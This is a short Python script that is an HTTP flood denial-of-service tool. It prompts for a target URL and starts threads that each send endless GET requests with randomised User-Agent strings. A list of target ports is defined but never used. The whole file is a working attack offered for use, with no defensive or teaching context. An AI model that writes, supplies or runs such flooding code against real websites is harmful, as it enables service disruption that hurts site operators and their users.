import requests
import threading
import random
import time
import socket

def http_flood(url):
    while True:
        try:
            headers = {'User-Agent': f'Mozilla/5.0 (Windows NT {random.randint(5, 10)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{random.randint(100, 200)} Safari/537.36'}
            response = requests.get(url, headers=headers)
            print(f"HTTP Flood on {url} - Response code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
url = input("Enter the target URL: ")
target_ports = [80, 443, 22, 8080, 3389]  
for port in target_ports:
    for attack_module in [http_flood]:
        
        threading.Thread(target=attack_module, args=(url,)).start()

